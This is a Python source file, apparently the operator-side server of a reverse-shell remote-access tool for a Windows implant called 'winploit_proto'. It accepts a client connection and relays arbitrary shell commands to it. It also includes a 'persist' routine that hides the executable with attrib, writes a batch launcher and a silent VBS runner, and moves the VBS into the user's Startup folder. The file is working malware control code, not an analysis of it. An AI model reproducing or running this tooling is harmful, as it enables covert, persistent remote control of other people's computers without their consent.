import socket
import sys
import struct
import colorama
from colorama import Fore, Style
import os
import time

colorama.init()

def read_exact(sock, n, timeout=5):
    """Read exactly n bytes from the socket with timeout."""
    sock.settimeout(timeout)
    data = b""
    start_time = time.time()
    while len(data) < n:
        if time.time() - start_time > timeout:
            raise TimeoutError("Timeout reading from socket")
        packet = sock.recv(n - len(data))
        if not packet:
            raise ConnectionError("Socket connection broken")
        data += packet
    sock.settimeout(None)
    return data

def handle_client(client_socket, client_address):
    addr_str = f"{Fore.GREEN}{client_address[0]}:{client_address[1]}{Style.RESET_ALL}"
    print(f"Accepted connection from {addr_str}")

    # Read initial "ready" message
    try:
        len_bytes = read_exact(client_socket, 4)
        length = struct.unpack('!I', len_bytes)[0]
        data = read_exact(client_socket, length)
        print(f"Client message: {data.decode('utf-8').strip()}")
    except Exception as e:
        print(f"Error reading initial message: {e}")
        client_socket.close()
        return

    print(f"Type commands to send to the client (type 'exit' to quit)")

    # File name for the executable
    file_name = "winploit_proto"

    while True:
        command = input(f"{addr_str} $ ").strip()

        # Handle cls and clear locally
        if command in ["cls", "clear"]:
            os.system("cls" if sys.platform == "win32" else "clear")
            continue

        # Handle persist command
        if command == "persist":
            current_dir = None
            appdata_path = None

            # Initial commands to get paths
            initial_commands = [
                "echo %cd%",  # Get current directory
                "echo %APPDATA%"  # Get APPDATA path
            ]

            # Execute initial commands to set current_dir and appdata_path
            for i, cmd in enumerate(initial_commands):
                print(f"{Fore.MAGENTA}Sending command: {cmd}{Style.RESET_ALL}")
                client_socket.sendall(f"{cmd}\n".encode('utf-8'))

                try:
                    print("Waiting for response length")
                    len_bytes = read_exact(client_socket, 4)
                    length = struct.unpack('!I', len_bytes)[0]
                    print(f"Received response length: {length}")
                    data = read_exact(client_socket, length)
                    if not data:
                        print(f"Client {addr_str} disconnected")
                        break

                    try:
                        response = data.decode('utf-8').strip()
                        print(f"Response: {response}")
                        if i == 0 and response:  # echo %cd%
                            current_dir = response
                        elif i == 1 and response:  # echo %APPDATA%
                            appdata_path = response
                    except UnicodeDecodeError:
                        print(f"Error decoding response: {data[:100]}...")
                except Exception as e:
                    print(f"Error reading response: {e}")
                    break

                # Prompt for confirmation
                if i < len(initial_commands) - 1:
                    while True:
                        proceed = input("Proceed with next command? (Y/N): ").strip().upper()
                        if proceed in ['Y', 'N']:
                            break
                        print("Please enter Y or N")
                    if proceed == 'N':
                        print("Persistence setup aborted")
                        break
                if not data:
                    break

            if current_dir is None or appdata_path is None:
                print("Error: Failed to retrieve current_dir or appdata_path. Aborting persistence.")
                continue

            # Define remaining persistence commands with actual current_dir and appdata_path
            persistence_commands = [
                f'attrib +h +s +r {file_name}.exe',
                f'echo @echo off > "{file_name}_start.bat" && echo cd /d "{current_dir}" >> "{file_name}_start.bat" && echo start "" "{file_name}.exe" >> "{file_name}_start.bat"',
                f'attrib +h +s +r {file_name}_start.bat',
                f'echo Set WshShell = CreateObject("WScript.Shell") > "{file_name}_run.vbs" && echo WshShell.Run "cmd /c {current_dir}\\{file_name}_start.bat", 0, False >> "{file_name}_run.vbs" && echo Set WshShell = Nothing >> "{file_name}_run.vbs"',
                f'move "{file_name}_run.vbs" "{appdata_path}\\Microsoft\\Windows\\STARTM~1\\Programs\\Startup"'
            ]

            # Execute remaining persistence commands
            for i, cmd in enumerate(persistence_commands):
                print(f"{Fore.MAGENTA}Sending command: {cmd}{Style.RESET_ALL}")
                client_socket.sendall(f"{cmd}\n".encode('utf-8'))

                try:
                    print("Waiting for response length")
                    len_bytes = read_exact(client_socket, 4)
                    length = struct.unpack('!I', len_bytes)[0]
                    print(f"Received response length: {length}")
                    data = read_exact(client_socket, length)
                    if not data:
                        print(f"Client {addr_str} disconnected")
                        break

                    try:
                        response = data.decode('utf-8').strip()
                        print(f"Response: {response}")
                    except UnicodeDecodeError:
                        print(f"Error decoding response: {data[:100]}...")
                except Exception as e:
                    print(f"Error reading response: {e}")
                    break

                # Prompt for confirmation (except for the last command)
                if i < len(persistence_commands) - 1:
                    while True:
                        proceed = input("Proceed with next command? (Y/N): ").strip().upper()
                        if proceed in ['Y', 'N']:
                            break
                        print("Please enter Y or N")
                    if proceed == 'N':
                        print("Persistence setup aborted")
                        break

            continue  # Return to main command prompt

        # Print manual command in magenta
        print(f"{Fore.MAGENTA}Sending command: {command}{Style.RESET_ALL}")

        # Send regular command to client
        client_socket.sendall(f"{command}\n".encode('utf-8'))

        # Check for exit command
        if command == "exit":
            try:
                len_bytes = read_exact(client_socket, 4)
                length = struct.unpack('!I', len_bytes)[0]
                data = read_exact(client_socket, length)
                print(data.decode('utf-8').strip())
            except Exception as e:
                print(f"Error reading exit response: {e}")
            break

        # Read response
        try:
            print("Waiting for manual command response")
            len_bytes = read_exact(client_socket, 4)
            length = struct.unpack('!I', len_bytes)[0]
            print(f"Received manual response length: {length}")
            data = read_exact(client_socket, length)
            if not data:
                print(f"Client {addr_str} disconnected")
                break

            try:
                print(data.decode('utf-8').strip())
            except UnicodeDecodeError:
                print(f"Error decoding response: {data[:100]}...")
        except Exception as e:
            print(f"Error reading response: {e}")
            break

    client_socket.close()
    print(f"Connection with {addr_str} closed")

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    host = '0.0.0.0'
    port = 7878
    server_addr = f"{Fore.BLUE}{host}:{port}{Style.RESET_ALL}"
    try:
        server_socket.bind((host, port))
    except OSError as e:
        print(f"Error: Could not bind to {server_addr}. {e}")
        return

    server_socket.listen(1)
    print(f"Server listening on {server_addr}")
    print("Waiting for a client connection...")

    try:
        client_socket, client_address = server_socket.accept()
        handle_client(client_socket, client_address)
    except KeyboardInterrupt:
        print("\nServer shutting down")
    except Exception as e:
        print(f"Error accepting connection: {e}")
    finally:
        server_socket.close()

if __name__ == "__main__":
    main()